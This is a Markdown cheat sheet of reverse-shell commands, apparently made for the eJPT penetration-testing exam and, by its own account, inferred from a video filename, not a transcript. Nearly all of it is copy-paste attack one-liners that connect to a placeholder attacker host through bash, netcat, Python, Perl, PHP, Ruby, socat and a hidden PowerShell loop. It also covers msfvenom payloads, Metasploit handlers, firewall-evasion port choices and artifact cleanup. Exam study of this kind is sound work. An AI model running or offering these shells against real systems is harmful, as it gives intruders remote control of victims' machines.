# Reverse Shell Cheatsheet (eJPT)

Note: No transcript provided. The following is a conservative, exam-focused cheat sheet inferred from the filename and folder context (01-Bind&ReverseShells/10 - Reverse Shell Cheatsheet.mp4).

## What the video covers (Introduction / big picture)
- Reverse shell fundamentals and when to use them vs bind shells.
- Reliable one-liners for Linux and Windows across common interpreters (bash, nc, socat, python, perl, php, ruby, PowerShell).
- Listener setup (nc/ncat/socat/Metasploit), robust TTY upgrades, and quick troubleshooting.
- Practical payload selection based on what’s available on the target.
- Minimal commands you can copy/paste under exam pressure.

## Flow (ordered)
1. Identify your LHOST and pick an egress-friendly LPORT (often 443/80/53).
2. Start a listener (nc/ncat/rlwrap/socat/Metasploit).
3. On the target, determine available tools/interpreters (which python3, nc, socat, php, perl, ruby; echo $0).
4. Fire an appropriate one-liner reverse shell.
5. Catch the shell and immediately upgrade to a stable TTY.
6. If blocked, switch interpreter/port or wrap with TLS (ncat --ssl) and retry.
7. Optional: move to a framework handler (Metasploit) for convenience.

## Tools highlighted
- netcat (nc), ncat (Nmap), BusyBox nc
- socat
- bash (/dev/tcp), sh
- python2/3, perl, php, ruby
- PowerShell (Windows)
- rlwrap, pwncat-cs (quality of life)
- Metasploit Framework (msfvenom, multi/handler)
- Optional: ncat --ssl for encrypted egress

## Typical command walkthrough (detailed, copy-paste friendly)

Replace ATTACKER and PORT with your IP and chosen port. Start with a listener.

1) Start a listener (Linux attacker)
```
# Basic
nc -lvnp 4444

# Better line-editing/history
rlwrap -cAr nc -lvnp 4444

# TLS (if target has ncat with --ssl)
ncat --ssl -lvnp 443

# Robust TTY listener (paired with socat on target)
socat -d -d TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0
```

2) Linux target one-liners

- Bash TCP (native bash; very common)
```
bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
```

- Netcat with -e (only if the target’s nc supports -e, e.g., traditional nc, ncat, BusyBox)
```
nc ATTACKER PORT -e /bin/sh
# or
ncat ATTACKER PORT -e /bin/bash
# or BusyBox
busybox nc ATTACKER PORT -e /bin/sh
```

- Netcat without -e (OpenBSD nc fallback using mkfifo)
```
rm -f /tmp/f; mkfifo /tmp/f
/bin/sh -i < /tmp/f 2>&1 | nc ATTACKER PORT > /tmp/f
```

- Python3 (preferred if available, spawns a pty directly)
```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

- Perl
```
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- PHP (proc_open reliable)
```
php -r '$s=fsockopen("ATTACKER",PORT);$p=proc_open("/bin/sh -i",[0=>$s,1=>$s,2=>$s],$pipes);'
```

- Ruby
```
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

- socat (best interactive TTY if socat exists on target; use socat listener above)
```
socat TCP:ATTACKER:PORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

3) Windows target one-liners

- PowerShell TCP reverse shell (works on vanilla Windows)
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$a='ATTACKER';$p=PORT;$c=New-Object System.Net.Sockets.TCPClient($a,$p);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS ' + (pwd).Path + '> ';$o=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($o,0,$o.Length)}"
```

- ncat with -e (if nc/ncat available on Windows)
```
ncat.exe ATTACKER PORT -e cmd.exe
```

4) TTY upgrade (Linux reverse shells)

- If you don’t already have a pty:
```
python -c 'import pty; pty.spawn("/bin/bash")'  # or python3 ...
export TERM=xterm
```

- Fix line discipline and resize (on attacker side)
```
# Press Ctrl+Z to background the session
stty raw -echo; fg
reset
export TERM=xterm
stty rows 40 cols 120
```

5) Metasploit alternative

- Generate payloads
```
# Windows x64 reverse shell (non-meterpreter)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f exe -o shell.exe

# Linux x64 reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f elf -o shell.elf
```

- Start a handler
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST ATTACKER; set LPORT PORT; run -j"
# or for Linux payload
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST ATTACKER; set LPORT PORT; run -j"
```

6) Encrypted reverse shell (if egress allows TLS and target has ncat)
```
# Attacker
ncat --ssl -lvnp 443
# Target
ncat --ssl ATTACKER 443 -e /bin/bash
```

## Practical tips
- Choose egress-friendly ports: 443, 80, 53, 8080 often pass outbound firewalls.
- Identify tooling first: which python3 python perl php ruby nc ncat socat; echo $0; uname -a.
- Netcat flavors differ: if -e fails, use mkfifo fallback or use python/perl.
- Prefer socat or python pty for a real TTY; else use rlwrap on your listener.
- If commands are injected via HTTP, mind quoting/escaping; when in doubt, wrap in bash -c '...'.
- If connection fails: try different port, switch transport (TLS via ncat --ssl), or try another interpreter.
- Clean up artifacts: rm /tmp/f; remove dropped binaries; avoid noisy commands.
- Always verify your LHOST is reachable by the target (VPN/tun0 IP vs eth0).

## Minimal cheat sheet (one-screen flow)

```
# Listener (attacker)
rlwrap -cAr nc -lvnp 4444

# Linux targets
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
nc ATTACKER 4444 -e /bin/sh                # if nc supports -e
rm -f /tmp/f; mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc ATTACKER 4444 > /tmp/f
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
php -r '$s=fsockopen("ATTACKER",4444);$p=proc_open("/bin/sh -i",[0=>$s,1=>$s,2=>$s],$pipes);'
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# TTY upgrade
python -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
# Ctrl+Z then locally:
stty raw -echo; fg; reset; stty rows 40 cols 120

# Windows target
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$a='ATTACKER';$p=4444;$c=New-Object System.Net.Sockets.TCPClient($a,$p);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS ' + (pwd).Path + '> ';$o=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($o,0,$o.Length)}"
ncat.exe ATTACKER 4444 -e cmd.exe

# Metasploit handler (optional)
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST ATTACKER; set LPORT 4444; run -j"
```

## Summary
- Reverse shells let the target initiate an outbound connection to your listener—ideal behind NAT/firewalls.
- Start with a reliable listener, pick an egress-friendly port, and choose the shortest working one-liner based on available interpreters.
- For Linux, bash /dev/tcp, python3, and nc-mkfifo are the most dependable. On Windows, a PowerShell TCP loop is universally available.
- Immediately upgrade/stabilize your TTY (pty.spawn, stty, or socat) for a usable session.
- If blocked, switch ports, interpreter, or wrap in TLS (ncat --ssl), and consider Metasploit handlers for convenience.